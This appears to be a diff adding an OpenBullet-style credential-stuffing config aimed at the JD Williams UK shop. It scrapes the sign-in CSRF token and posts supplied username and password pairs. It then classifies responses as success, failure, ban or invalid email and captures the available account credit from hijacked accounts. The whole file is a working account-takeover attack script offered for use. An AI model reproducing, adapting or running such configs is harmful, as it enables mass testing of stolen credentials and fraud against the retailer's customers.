@@ -1,0 +1,50 @@
+[SETTINGS]
+{
+  "Name": "JdWilliams",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-03T18:06:41.2414807+00:00",
+  "AdditionalInfo": "",
+  "Author": "v0ilawes",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#go_to_site REQUEST GET "https://www.jdwilliams.co.uk/shop/signin/display.action?decoration=true&cm_sp=JDW-Header-_-SignIn-_-SignIn" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#grab_token PARSE "<SOURCE>" CSS "[name=csrfRandomFormToken]" "value" 0 -> VAR "token" "" "" 
+#login REQUEST POST "https://www.jdwilliams.co.uk/shop/signin/process.action" AutoRedirect=TRUE 
+  CONTENT "accountRefOrEmail=<USER>&password=<PASS>&rememberMe=&__checkbox_rememberMe=&csrfRandomFormToken=<token>&isMobileApp=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.jdwilliams.co.uk/shop/signin/display.action?decoration=true&cm_sp=JDW-Header-_-SignIn-_-SignIn" 
+#can_we? KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "class=\"accountDetail\">&pound" 
+  KEYCHAIN Ban OR 
+    KEY "Your secure session has expired" 
+    KEY "Request unsuccessful" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "If this email address is incorrect, " 
+#show_me_the_money PARSE "<SOURCE>" LR "class=\"accountDetail\">&pound;" "<" Recursive=FALSE -> CAP "Available" "" "" 
